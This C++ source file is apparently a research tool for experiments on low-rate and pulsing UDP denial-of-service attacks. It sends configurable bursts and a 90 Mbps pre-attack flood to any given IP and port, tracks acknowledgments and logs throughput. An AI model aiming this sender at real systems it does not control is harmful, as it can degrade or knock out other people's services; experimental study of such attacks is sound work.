#include <iostream>
#include <chrono>
#include <thread>
#include <cstring>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <atomic>
#include <mutex>
#include "udp-socket.hh"
#include "sender.hh"
#include <unordered_map>

// Declare unacknowledged_packets globally
std::unordered_map<int, Packet> unacknowledged_packets; 
std::mutex packet_mutex;
std::mutex log_mutex;

// Helper function to get sequence number from packet
int get_sequence_number(const Packet& packet) {
    int seq_num;
    memcpy(&seq_num, packet.data, HEADER_SIZE);
    return seq_num;
}

bool initialize_sender(UDPSocket& socket) {
    if (socket.is_valid()) {
        std::cout << "Sender socket initialized and ready to send." << std::endl;
        return true;
    } else {
        std::cerr << "Error: Sender socket initialization failed." << std::endl;
        return false;
    }
}

size_t total_acked_bytes = 0;
std::chrono::steady_clock::time_point ack_start_time = std::chrono::steady_clock::now();

void handle_ack(const char* ack_data, std::ofstream& log_file) {
    int ack_number;
    memcpy(&ack_number, ack_data, HEADER_SIZE);

    auto now = std::chrono::steady_clock::now();

    {   std::lock_guard<std::mutex> lock(packet_mutex);
        auto it = unacknowledged_packets.find(ack_number);
        if (it != unacknowledged_packets.end()) {
            total_acked_bytes += PACKET_SIZE;
            unacknowledged_packets.erase(ack_number);
        }
    }
}

bool send_packet(UDPSocket& socket, const Packet& packet, const std::string& target_ip, int target_port) {
    try {
        socket.senddata(packet.data, PACKET_SIZE, target_ip, target_port);
        return true;
    } catch (const std::exception& e) {
        std::cerr << "Failed to send packet: " << e.what() << std::endl;
        return false;
    }
}

double calculate_burst_rate(int burst_size, int burst_duration) {
    return static_cast<double>(burst_size) / burst_duration;
}

void low_rate_volumetric_attack(UDPSocket& socket, const std::string& target_ip, int target_port, double packet_interval, int duration, int& total_bytes_sent, std::ofstream& log_file) {
    int seq_number = 0;
    auto start_time = std::chrono::steady_clock::now();
    auto last_log_time = start_time;

    while (true) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();

        if (elapsed_time >= duration) {
            std::cout << "Experiment duration reached. Stopping low-rate volumetric attack." << std::endl;
            break;
        }

        Packet packet;
        std::memset(packet.data + HEADER_SIZE, 'X', PAYLOAD_SIZE);
        memcpy(packet.data, &seq_number, HEADER_SIZE);
        packet.send_time = std::chrono::steady_clock::now();
        
        std::lock_guard<std::mutex> lock(packet_mutex);
        unacknowledged_packets[seq_number] = packet;
        seq_number++;

        if (!send_packet(socket, packet, target_ip, target_port)) {
            std::cerr << "Error in sending packet. Retrying." << std::endl;
            continue;
        }

        total_bytes_sent += PACKET_SIZE;

        if (std::chrono::duration_cast<std::chrono::milliseconds>(now - last_log_time).count() >= 1) {
            log_file << std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count()
                     << " : " << total_bytes_sent << std::endl;
            last_log_time = now;
        }

        std::this_thread::sleep_for(std::chrono::duration<double, std::milli>(packet_interval));
    }
}

void pre_attack_phase(UDPSocket& socket, const std::string& target_ip, int target_port, int pre_attack_duration_ms, double pre_attack_rate_mbps, int& total_bytes_sent, std::ofstream& log_file, std::chrono::steady_clock::time_point& last_log_time, int& seq_number) {
double packets_per_second = (pre_attack_rate_mbps * 1024 * 1024) / (PACKET_SIZE * 8);
    double packet_interval_ms = 1000.0 / packets_per_second;
    
    auto start_time = std::chrono::steady_clock::now();

    std::cout << "Starting pre-attack phase at " << pre_attack_rate_mbps << " Mbps for " << pre_attack_duration_ms << " ms." << std::endl;
    std::cout << "Packet interval: " << packet_interval_ms << " ms" << std::endl;  // Debug print
    log_file << "Pre attack phase:" << std::endl;

    while (true) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed_time_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now - start_time).count();

        if (elapsed_time_ms >= pre_attack_duration_ms) {
            std::cout << "Pre-attack phase complete. Elapsed time: " << elapsed_time_ms << " ms" << std::endl;
            break;
        }

        Packet packet;
        std::memset(packet.data + HEADER_SIZE, 'X', PAYLOAD_SIZE);
        memcpy(packet.data, &seq_number, HEADER_SIZE);
        packet.send_time = std::chrono::steady_clock::now();

        std::lock_guard<std::mutex> lock(packet_mutex);
        unacknowledged_packets[seq_number] = packet;
        seq_number++;

        if (!send_packet(socket, packet, target_ip, target_port)) {
            std::cerr << "Error: Failed to send packet in pre-attack phase. Retrying." << std::endl;
            continue;
        }

        total_bytes_sent += PACKET_SIZE;

        // Log total bytes sent every millisecond
        if (std::chrono::duration_cast<std::chrono::milliseconds>(now - last_log_time).count() >= 1) {
            log_file << std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count()
                     << " : " << total_bytes_sent << " : " << total_acked_bytes << std::endl;
            last_log_time = now;
        }

        // Sleep for the calculated interval
        std::this_thread::sleep_for(std::chrono::duration<double, std::milli>(packet_interval_ms));
    }

    log_file << "End of pre attack phase. Total bytes sent: " << total_bytes_sent << std::endl;
    std::cout << "Pre-attack phase ended. Moving to custom attack..." << std::endl;
}

int main(int argc, char *argv[]) {
    if (argc < 8 || argc > 9) {
        std::cerr << "Usage: " << argv[0] << " <IP> <Port> <burst_size> <burst_duration> <inter_burst_time> <logfile> <duration> [-c | -v]" << std::endl;
        return 1;
    }

    std::string target_ip = argv[1];
    int target_port = std::stoi(argv[2]);
    int burst_size = std::stoi(argv[3]);
    int burst_duration = std::stoi(argv[4]);
    int inter_burst_time = std::stoi(argv[5]);
    std::string logfile_name = argv[6];
    int duration = std::stoi(argv[7]);
    std::string attack_type = argv[8];

    if (attack_type != "-c" && attack_type != "-v") {
        std::cerr << "Error: Invalid attack type. Use '-c' for custom attack or '-v' for volumetric attack." << std::endl;
        return 1;
    }

    std::ofstream log_file(logfile_name);
    if (!log_file.is_open() || !log_file.good()) {
        std::cerr << "Error: Unable to open log file " << logfile_name << std::endl;
        return 1;
    }

    UDPSocket socket;
    if (!initialize_sender(socket)) {
        return 1;
    }

    if (socket.bindsocket("0.0.0.0", target_port, target_port + 1) != 0) {
        std::cerr << "Error: Failed to bind socket for receiving ACKs." << std::endl;
        return 1;
    }

    std::atomic<bool> stop_ack_listener(false);

    auto start_time = std::chrono::steady_clock::now();
    int total_bytes_sent = 0;
    int seq_number = 0;
    auto last_log_time = std::chrono::steady_clock::now();

    log_file << "Burst Size: " << burst_size 
             << ", Burst Duration: " << burst_duration
             << ", Inter Burst Time: " << inter_burst_time
             << ", Duration of Experiment(s): " << duration << std::endl;
    log_file << "Log started at " << std::chrono::duration_cast<std::chrono::milliseconds>(start_time.time_since_epoch()).count() << " ms" << std::endl;

	std::thread ack_listener([&]() {
    	char ack_buffer[sizeof(int)];
    	while (!stop_ack_listener) {
        	try {
            	UDPSocket::SockAddress sender_addr = {};
            	// Changed from -1 (infinite) to 100ms timeout
            	int bytes_received = socket.receivedata(ack_buffer, sizeof(ack_buffer), 100, sender_addr);
            	if (bytes_received == sizeof(int)) {
                	handle_ack(ack_buffer, log_file);
            	}
        	} catch (const std::exception& e) {
            	if (!stop_ack_listener) {
                	std::cerr << "Error receiving ACK: " << e.what() << std::endl;
            	}
        	}
    	}
    	std::cout << "ACK listener thread terminated." << std::endl;
	});

    auto actual_start_time = std::chrono::steady_clock::now();

    if (attack_type == "-v") {
        double packet_interval = 1.0 / ((9 * 1024 * 1024 / PACKET_SIZE) / 8);
        low_rate_volumetric_attack(socket, target_ip, target_port, packet_interval, duration, total_bytes_sent, log_file);
    } else {
        int pre_attack_duration_ms = 4000;
        double pre_attack_rate_mbps = 90;
        pre_attack_phase(socket, target_ip, target_port, pre_attack_duration_ms, pre_attack_rate_mbps, total_bytes_sent, log_file, last_log_time, seq_number);
    
        double burst_rate = calculate_burst_rate(burst_size, burst_duration);
        double burst_pkt_tx_delay = PACKET_SIZE / burst_rate;

        auto last_burst_time = std::chrono::steady_clock::now();
        auto last_send_time = std::chrono::steady_clock::now();
        auto last_log_time = std::chrono::steady_clock::now();
        int burst_bytes_sent = 0;
        bool send_burst = false;
        int interval_bytes_sent = 0;
        long last_burst_end_time = 0;

        int packets_sent_in_burst = 0; // Initialize burst packet counter


        while (true) {
            auto now = std::chrono::steady_clock::now();
            long current_time_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
            auto elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();

            if (elapsed_time >= duration) {
                std::cout << "Experiment duration reached. Stopping sender." << std::endl;
                break;
            }
            
            //debug statement
            //std::cout << " Inter burst time: " << inter_burst_time << ", At time: " << std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count() <<std::endl;
            
            if (send_burst == false && std::chrono::duration_cast<std::chrono::milliseconds>(now - last_burst_time).count() >= inter_burst_time) {
                //std::cout << " Condition time: " << std::chrono::duration_cast<std::chrono::milliseconds>(now - last_burst_time).count() << std::endl;
                //std::cout<< "Last burst time (in if loop): " << std::chrono::duration_cast<std::chrono::milliseconds>(last_burst_time.time_since_epoch()).count() << std::endl;
                send_burst = true;
                last_burst_time = now;
                last_burst_end_time = current_time_ms;
                burst_bytes_sent = 0;
            }

            //if (send_burst && std::chrono::duration_cast<std::chrono::milliseconds>(now - last_send_time).count() > burst_pkt_tx_delay) {
            if (send_burst && (std::chrono::duration<double, std::milli>(now - last_send_time).count() > burst_pkt_tx_delay)) {
                if(std::chrono::duration_cast<std::chrono::milliseconds>(now - last_burst_time).count() > burst_duration) {
                    send_burst = false;
                    //std::cout<< "Last burst time (in if-if loop): " << std::chrono::duration_cast<std::chrono::milliseconds>(last_burst_time.time_since_epoch()).count() << std::endl;
                }
                else {
                    Packet packet;
                    std::memset(packet.data + HEADER_SIZE, 'X', PAYLOAD_SIZE);
                    memcpy(packet.data, &seq_number, HEADER_SIZE);
                    packet.send_time = std::chrono::steady_clock::now();

                    std::lock_guard<std::mutex> lock(packet_mutex);
                    unacknowledged_packets[seq_number] = packet;
                    seq_number++;

                    if (!send_packet(socket, packet, target_ip, target_port)) {
                        std::cerr << "Error in sending packet. Aborting current burst." << std::endl;
                        send_burst = false;
                        continue;
                    }
                    //std::cout << "Debug print" << std::endl;
                    total_bytes_sent += PACKET_SIZE;
                    burst_bytes_sent += PACKET_SIZE;
                    interval_bytes_sent += PACKET_SIZE;

                    last_send_time = now;

                    if (burst_bytes_sent >= burst_size) {
                        burst_bytes_sent = 0;
                        last_burst_time = now;
                        send_burst = false;
                        std::cout<< "Last burst time (in else loop): " << std::chrono::duration_cast<std::chrono::milliseconds>(last_burst_time.time_since_epoch()).count() << std::endl;
                    }
                }
            }
            
            auto now_ms = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::milliseconds>(now_ms - last_log_time).count() >= 1) {
                log_file << std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count()
                        << " : " << total_bytes_sent << " : " << total_acked_bytes << std::endl;
                last_log_time = now_ms;
            }
        }
    }

    stop_ack_listener = true;

    if (ack_listener.joinable()) {
        ack_listener.join();
    }

    auto end_time = std::chrono::steady_clock::now();
    //double duration_seconds = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();
    double duration_seconds = (std::chrono::duration<double, std::milli>(end_time - actual_start_time).count())/1000;
    //std::cout << "Total bytes sent at the end of exp: " << total_bytes_sent << std::endl;
    //std::cout << "Duration of exp: " << duration_seconds << std::endl;
    double total_bits = static_cast<double>(total_bytes_sent) * 8;
    //std::cout << "Total bits sent: " << total_bits << std::endl;
    double average_throughput = total_bits / duration_seconds;
    //std::cout << "Average Throughput (bps): " << average_throughput << std::endl;

    log_file << "Average Throughput (bps): " << average_throughput << std::endl;
    log_file.close();
    return 0;

}